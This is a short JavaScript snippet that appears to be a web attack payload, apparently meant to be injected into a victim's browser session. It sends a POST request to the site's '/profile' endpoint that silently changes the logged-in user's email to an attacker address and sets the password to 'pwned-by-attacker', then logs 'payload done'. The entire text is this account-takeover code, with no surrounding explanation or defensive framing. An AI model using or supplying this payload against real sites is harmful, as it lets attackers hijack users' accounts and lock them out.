fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=" + encodeURIComponent("attacker@evil.example") + "&password=" + encodeURIComponent("pwned-by-attacker")
}).then(function () {
  console.log("payload done");
});
